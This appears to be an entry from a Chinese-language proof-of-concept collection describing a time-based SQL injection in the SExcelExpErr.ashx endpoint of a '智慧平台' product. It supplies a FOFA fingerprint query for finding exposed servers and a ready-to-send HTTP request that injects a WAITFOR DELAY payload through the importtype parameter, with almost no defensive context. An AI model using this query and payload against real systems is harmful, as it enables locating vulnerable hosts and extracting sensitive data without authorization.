### 智慧平台SExcelExpErr.ashx存在SQL注入漏洞
智慧平台SExcelExpErr存在SQL注入漏洞，攻击者可通过该漏洞获取数据敏感信息。

## fofa
```javascript
body="custom/blue/uimaker/easyui.css"
```

## poc

```plain
GET /ashx/KQ/SExcelExpErr.ashx?action=list&importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1728547381034-1a95c6c4-532a-43f3-b852-1c52b5cb8fc5.png)

